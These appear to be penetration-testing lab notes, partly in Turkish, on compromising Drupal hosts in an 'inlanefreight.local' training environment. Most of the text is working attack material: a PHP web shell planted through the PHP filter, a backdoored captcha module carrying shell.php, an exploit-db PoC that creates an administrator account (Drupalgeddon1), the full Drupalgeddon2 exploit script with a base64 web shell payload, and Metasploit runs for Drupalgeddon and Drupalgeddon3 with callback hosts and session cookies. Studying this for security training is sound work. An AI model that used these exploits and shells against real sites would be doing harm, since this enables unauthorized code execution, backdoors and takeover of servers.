# Attacking Drupal

## RCE

### Before Drupal 8

1. Modules
    * PHP filter
    * Save configuration
2. Content
    * Add content
    * Basic page
    * Text format: PHP code
    * Save

```php title="Create Basic page"
<?php
system($_GET[0]);
?>
```

```sh
my@attack:~$ curl -s 'http://drupal-qa.inlanefreight.local/node/3?0=id' | html2text | grep uid
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupal 8

1. Extend
    * CORE: Update Manager
    * Install
2. Reports
    * Available updates
    * Install new module or theme
    * Browse: [php 8.x-1.1.tar.gz](https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz)
    * Install
3. Extend
    * FILTERS: PHP Filter
    * Install
4. Content
    * Add content
    * Basic page
    * Text format: PHP code
    * Save

```php title="Create Basic page"
<?php
system($_GET[0]);
?>
```

```sh
my@attack:~$ curl -s 'http://drupal-dev.inlanefreight.local/node/3?0=id' | html2text | grep uid
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Uploading Backdoor Module

```php title="shell.php" linenums="1"
<?php
system($_GET[0]);
?>
```

```apache title=".htaccess" linenums="1" hl_lines="3"
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

```sh
my@attack:~$ wget -q 'https://ftp.drupal.org/files/projects/captcha-8.x-1.0.tar.gz'
my@attack:~$ tar xzf captcha-8.x-1.0.tar.gz
my@attack:~$ mv shell.php .htaccess captcha
my@attack:~$ tar czf captcha.tar.gz captcha
```

1. Extend
    * CORE: Update Manager
    * Install
2. Reports
    * Available updates
    * Install new module or theme
    * Browse: captcha.tar.gz
    * Install

```sh
my@attack:~$ curl -s 'http://drupal-dev.inlanefreight.local/modules/captcha/shell.php?0=id' | html2text | grep uid
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Drupalgeddon1 ([CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005))

### POC

!!! abstract

    [34992.py](https://www.exploit-db.com/exploits/34992) için gerekenler:

    1. URL.
    2. Oluşturulacak kullanıcı için ad.
    3. Oluşturulacak kullanıcı için parola.

```sh
my@attack:~$ python2 34992.py -t "http://drupal-qa.inlanefreight.local" -u hacker -p password
```

```output title="Output" hl_lines="3"
[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: password
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

### Metasploit

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use exploit/multi/http/drupal_drupageddon
msf6 exploit(multi/http/drupal_drupageddon) > set LHOST 10.10.15.37
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 10.129.170.73
msf6 exploit(multi/http/drupal_drupageddon) > set VHOST drupal-qa.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon) > run
```

## [Drupalgeddon2](https://www.exploit-db.com/exploits/44448) ([CVE-2018-7600](https://www.drupal.org/sa-core-2018-002))

```python title="44448.py" linenums="1" hl_lines="13 26 29 32"
#!/usr/bin/env
import sys
import requests

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by Vitalii Rudnykh')
print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
print ('# https://github.com/a2u/CVE-2018-7600')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

target = 'http://drupal-dev.inlanefreight.local/'

# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
# set verify = False if your proxy certificate is self signed
# remember to set proxies both for http and https
#
# example:
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# verify = False
proxies = {}
verify = True

url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo -n PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4= | base64 -d | tee shell.php'}

r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + 'shell.php')
if check.status_code != 200:
  sys.exit("Not exploitable")
print ('\nCheck: '+target+'shell.php')
```

```sh
my@attack:~$ python3 44448.py
my@attack:~$ curl -s 'http://drupal-dev.inlanefreight.local/shell.php?0=id'
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Drupalgeddon3 ([CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/))

!!! abstract

    [drupal_drupalgeddon3.rb](https://github.com/rithchard/Drupalgeddon3) için gerekenler:

    1. Geçerli bir Drupal düğümü.
    2. Kimliği doğrulanmış bir oturum çerezi.

```sh
my@attack:~$ mkdir -p ~/.msf4/modules/exploits/multi/http
my@attack:~$ mv drupal_drupalgeddon3.rb ~/.msf4/modules/exploits/multi/http
```

```sh
my@attack:~$ msfconsole -q
```

```sh
msf6 > use exploit/multi/http/drupal_drupageddon3
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_SESSION SESS45ecfcb93a827c3e578eae161f280548=WGGUE_PrTGJQwYkUel4VWEZMP8PRJ-9A21qWaO4NNQA
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.15.37
msf6 exploit(multi/http/drupal_drupageddon3) > set RHOSTS 10.129.170.73
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > run
```
